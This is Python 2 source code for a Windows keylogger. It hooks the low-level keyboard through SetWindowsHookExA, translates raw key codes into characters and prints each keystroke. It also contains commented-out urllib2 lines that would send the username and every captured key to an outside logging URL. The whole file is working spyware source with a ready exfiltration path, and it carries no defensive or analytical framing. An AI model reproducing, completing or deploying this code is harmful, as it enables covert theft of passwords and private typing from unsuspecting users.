import sys, ctypes, getpass, urllib2, time, cookielib, Cookie
from ctypes import *
from ctypes.wintypes import MSG
from ctypes.wintypes import DWORD

usr = getpass.getuser()
keys = {'292057776249': ' F10 ', '279172874358': ' F7 ', '261993005170': ' F3 ', '184683593948': '\\', '124554051746': ' Ctrl ', '115964117213': ']', '111669149915': '[', '103079215183': 'o', '98784247881': 'i', '81604378706': 'r', '34359738423': '7', '206158430274': 'b', '317827580013': '-', '309237645350': ' Up Arrow ', '304942678052': ' Home ', '304942678119': '7', '347892351010': ' Page Down ', '266287972467': ' F4 ', '180388626592': ' Shift ', '42949673017': '9', '270582939764': ' F5 ', '210453397582': 'n', '60129542152': ' Backspace ', '90194313305': 'y', '158913790027': 'k', '55834575035': '=', '25769803829': '5', '8589934641': '1', '257698037873': ' F2 ', '339302416481': '1', '197568495683': 'c', '287762808952': ' F9 ', '283467841655': ' F8 ', '373662154874': ' F11 ', '188978561114': 'z', '21474836532': '4', '51539607741': '-', '335007449195': '+', '330712481831': ' Right Arrow ', '313532612641': ' Page Up ', '227633266799': '/', '64424509449': ' Tab ', '377957122171': ' F12 ', '171798692062': "'", '94489280597': 'u', '47244640304': '0', '133143986259': 's', '150323855432': 'h', '223338299582': '.', '274877907061': ' F6 ', '322122547237': ' Left Arrow ', '309237645416': '8', '249108103188': ' Caps Lock ', '85899346004': 't', '339302416419': ' End ', '12884901938': '2', '107374182480': 'p', '73014444119': 'w', '390842024027': ' Windows Key ', '343597383720': ' Down Arrow ', '154618822730': 'j', '176093659328': '`', '253403070576': ' F1 ', '236223201386': '*', '38654705720': '8', '399431958621': ' Right Key Click ', '68719476817': 'q', '227633266879': '/', '352187318317': ' Insert ', '352187318368': '0', '356482285678': '.', '356482285614': ' Delete ', '322122547300': '4', '300647710865': ' Scroll Lock ', '236223201324': ' Print Screen ', '146028888135': 'g', '77309411397': 'e', '128849018945': 'a', '296352743568': ' Num Lock ', '296352743443': ' Pause Break ', '4294967323': ' esc ', '30064771126': '6', '141733920838': 'f', '330712481894': '6', '313532612713': '9', '326417514597': '5', '343597383778': '2', '347892351075': '3', '120259084301': ' Enter ', '17179869235': '3', '137438953540': 'd', '163208757324': 'l', '167503724730': ';', '193273528408': 'x', '201863462998': 'v', '214748364877': 'm', '219043332284': ',', '231928234145': ' Shift ', '244813135904': ' ', '395136991324': ' Windows Key ', '124554051747': ' Ctrl ', };
#req = urllib2.Request('http://revplay.ga/Logger/Log.php' + '?user=' + usr + '&data=' + 'Script Started.')
#res = urllib2.urlopen(req)

user32 = windll.user32                                              
kernel32 = windll.kernel32

WH_KEYBOARD_LL=13
WM_KEYDOWN=0x0100
CTRL_CODE = 162

class KeyLogger:                                                                  
    def __init__(self):
        self.lUser32= user32
        self.hooked = None
    
    def installHookProc(self, pointer):                                           
        self.hooked = self.lUser32.SetWindowsHookExA(WH_KEYBOARD_LL, pointer, kernel32.GetModuleHandleW(None), 0)
        if not self.hooked:
            return False
        return True
    
    def uninstallHookProc(self):                                                  
        if self.hooked is None:
            return
        self.lUser32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None

def getFPTR(fn):                                                                  
    CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
    return CMPFUNC(fn)
def split(input, size):
    return [input[start:start+size] for start in range(0, len(input), size)]
def hookProc(nCode, wParam, lParam):
    global mapping
    if wParam is not WM_KEYDOWN:
        return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)
    hookedKey = str(lParam[0])
    try:
        print keys[hookedKey]
        #req = urllib2.Request('http://revplay.ga/Logger/Log.php' + '?user=' + usr + '&data=' + keys[hookedKey])
        #res = urllib2.urlopen(req)
    except:
        print "Undefined Key - " + hookedKey
    if(CTRL_CODE == int(lParam[0])):
        print "Ctrl pressed, call uninstallHook()"
        keyLogger.uninstallHookProc()
        sys.exit(-1)
    return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)  
def startKeyLog():                                                                
     msg = MSG()
     user32.GetMessageA(byref(msg),0,0,0)
    
keyLogger = KeyLogger() #start of hook process                                    
pointer = getFPTR(hookProc) 

if keyLogger.installHookProc(pointer):
    print "installed keyLogger"
startKeyLog()
